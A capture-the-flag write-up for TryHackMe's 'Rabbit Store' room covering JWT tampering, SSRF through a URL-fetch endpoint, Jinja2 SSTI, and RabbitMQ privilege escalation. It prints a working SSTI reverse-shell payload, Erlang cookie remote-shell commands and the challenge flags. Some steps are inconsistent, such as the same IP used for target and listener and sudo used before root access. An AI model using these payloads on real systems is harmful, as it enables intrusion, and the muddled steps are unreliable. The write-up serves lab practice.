# TryHackMe - RabbitMQ CTF Write-Up 🐰💥  
**Author:** David Umoh  
**Room:** *Rabbit Store*  
**Category:** Web, SSTI, Privilege Escalation  
**Difficulty:** Medium/Hard  

---

## 🧠 Overview  
This write-up covers my full walkthrough of the *RabbitMQ-themed CTF* challenge on TryHackMe. The challenge involved API enumeration, a mass assignment vulnerability, a clever SSTI (Server-Side Template Injection) via a file fetch API, and finally RabbitMQ-based privilege escalation. I’ve documented every crucial step, including hiccups and enumeration logic, to help others replicate the exploitation path and learn the flow.

---

## 📌 Initial Enumeration  

**Target IP:** `10.8.137.194`  
We begin with an Nmap scan to identify open ports and services.

```bash
nmap -sC -sV -p- 10.8.137.194
```

**Results:**
```
22/tcp    open     ssh
80/tcp    open     http
4369/tcp  open     epmd
25672/tcp open     erl-dist
```

---

## 🗂 /etc/hosts Configuration  
To better interact with the web application, I added the following host entries:

```bash
sudo nano /etc/hosts
```

```text
10.8.137.194 cloudsite.thm
10.8.137.194 storage.cloudsite.thm
```

This allowed me to access the main site and subdomain directly.

---

## 🌐 Web App + Mass Assignment Exploit

### 🔍 Discovery
Visiting `http://cloudsite.thm` showed a typical subscription-based app. After creating a user, I noticed that premium features were restricted.

### 🔑 JWT Manipulation & Mass Assignment

Upon registering and logging in, I intercepted a JWT token and decoded it via [jwt.io](https://jwt.io/). The original payload looked like this:

```json
{
    "email": "tes@gmail.com",
    "iat": 1753303135,
    "exp": 1753306735
}
```

I modified the payload by adding:
```json
"subscription": "active"
```

Then, I re-signed the JWT using the original key and replaced the session token. This bypassed the premium check — classic mass assignment!

> 💡 **Hiccup:** Initially I assumed the app validated subscription status via backend calls. Only after testing several token variations did I confirm the app blindly trusted JWT content.

---

## 🚀 Dashboard Enumeration & SSTI

### 🧪 Upload Feature Abuse

The premium dashboard included a URL-based file upload feature. I intercepted the request:
```json
POST /api/store-url
{
  "url": "http://example.com/file.txt"
}
```

To test internal access, I sent:
```json
{
  "url": "http://127.0.0.1/api/docs"
}
```

This caused the app to download a local file, which was then available to me. Upon viewing the downloaded file, I uncovered critical internal API documentation:

---

## 📚 Internal API Map (Leaked via /api/docs)

```
POST:
- /api/register
- /api/login
- /api/upload
- /api/store-url
- /api/fetch_messeges_from_chatbot

GET:
- /api/uploads/filename
- /dashboard/inactive
- /dashboard/active
```

---

## ⚙️ Discovering Jinja2 via FFUF + Error-Based SSTI

I used `ffuf` to enumerate further API routes and confirm the `/api/fetch_messeges_from_chatbot` endpoint.

```bash
ffuf -u http://cloudsite.thm/api/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Authorization: Bearer <token>"
```

The chatbot endpoint accepted a `username` parameter. I sent:

```json
{
  "username": "${{<%[%'"}}%"
}
```

The response returned a Jinja2-related error — clear sign of SSTI vulnerability.

---

## 💥 Exploiting SSTI for RCE

I crafted the following SSTI payload to gain a reverse shell:

```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.8.137.194\",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}
```

Then I started a listener:

```bash
nc -lvnp 9001
```

Success! I got a shell as **azreal**.

> 🧩 Note: SSTI was buried in an obscure endpoint, only revealed through chained abuse of the upload feature and accessing internal docs.

---

## 🔐 Privilege Escalation via RabbitMQ

### 🔍 Discovering the Running RabbitMQ Service

Earlier, we saw ports `4369` and `25672` — both tied to Erlang & RabbitMQ.

```bash
ps aux | grep rabbit
```

RabbitMQ was installed but inactive. I restarted it:

```bash
sudo systemctl enable rabbitmq-server
sudo systemctl start rabbitmq-server
```

### 🔑 Getting `.erlang.cookie`

RabbitMQ nodes use a shared secret stored in:

```bash
/home/azreal/.erlang.cookie
```

We grabbed it and used it for authentication:

```bash
erl -sname attacker -setcookie <COOKIE> -remsh rabbit@forge
```

### 📤 Exporting Definitions

We used `rabbitmqctl` to export users:

```bash
sudo rabbitmqctl --node rabbit@forge export_definitions defs.json
```

Inside `defs.json`, we found hashed passwords:

```json
"password_hash": "sha256$...$..."
```

### 🔓 Cracking the Hash

I isolated the hash and decoded it with Python or online tools — this revealed the root user's password.

### ⬆️ Root Access

I switched to root using:

```bash
su - root
```

Entered the cracked password, and got the root flag:

```
eabf7a0b05d3f2028f3e0465d2fd0852
```

---

## 🏁 Flags

- **User Flag:** `996bdb1f619a68361417cabca5454705`
- **Root Flag:** `eabf7a0b05d3f2028f3e0465d2fd0852`

---

## 🧠 Final Thoughts

This challenge was a fun blend of modern web vulnerabilities and backend service abuse. I especially appreciated the multi-stage access pattern — from JWT tampering to internal API exploration to RabbitMQ privilege escalation. Takeaways:

- Always test JWT payloads for hidden logic like mass assignment.
- Use upload features to try localhost/internal access.
- Remember SSTI payload fuzzing (`${{<%[%'"}}%`) to trigger template errors.
- Services like RabbitMQ may expose privilege paths if misconfigured.

---

**Happy hacking!**  
– David Umoh 🚩